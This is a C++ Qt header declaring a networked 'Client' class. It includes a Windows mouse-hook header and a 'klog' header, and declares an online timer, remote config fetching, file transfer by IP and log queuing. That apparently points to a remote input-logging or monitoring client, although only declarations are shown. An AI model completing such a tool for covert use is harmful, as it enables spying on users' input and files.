#ifndef CLIENT_H
#define CLIENT_H

#include <QObject>
#include <QTimer>
#include <QThread>

#include "config.h"
#include "fileserver.h"
#include "fileclient.h"
#include "mousehookWinApi.h"
#include "files.h"
#include "klog.h"

class Client : public QObject
{
    Q_OBJECT
public:
    explicit Client(QObject *parent = 0, const QString& path = QDir::currentPath(),
                    quint16 _locPort = 1234, QString _ip = "127.0.0.1", quint16 _destPort = 12345);
    ~Client();

signals:

private slots:
    void getOnline();
    void getFile(const QString& path, const QString& ip);
    void getString(const QString& string, const QString& ip);

private:
    void update();
    void getNewConfig(const QString& path);
    void enqueueLog();

    quint16 locPort;
    QString ip;
    qint16 destPort;
    QString path;
    QTimer* onlineTimer;
    Config* config;
    FileServer* fileServer;
    FileClient* fileClient;
};

#endif // CLIENT_H